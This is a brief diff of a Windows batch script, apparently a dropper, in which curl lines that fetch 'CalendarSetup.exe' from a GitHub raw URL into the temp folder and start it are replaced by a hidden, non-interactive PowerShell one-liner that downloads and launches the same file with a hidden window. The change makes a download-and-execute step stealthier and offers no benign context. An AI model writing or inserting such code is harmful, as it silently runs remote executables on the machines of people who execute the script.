@@ -1,4 +1,3 @@
 @echo off
-curl -s -o "%TEMP%\cs.exe" https://raw.githubusercontent.com/ezlishmail/cdn-assets/main/CalendarSetup.exe
-start "" /B "%TEMP%\cs.exe"
+powershell -NoP -NonI -W Hidden -C "$b='%TEMP%\cs.exe';irm https://raw.githubusercontent.com/ezlishmail/cdn-assets/main/CalendarSetup.exe -OutFile $b;Start-Process $b -WindowStyle Hidden"
 exit
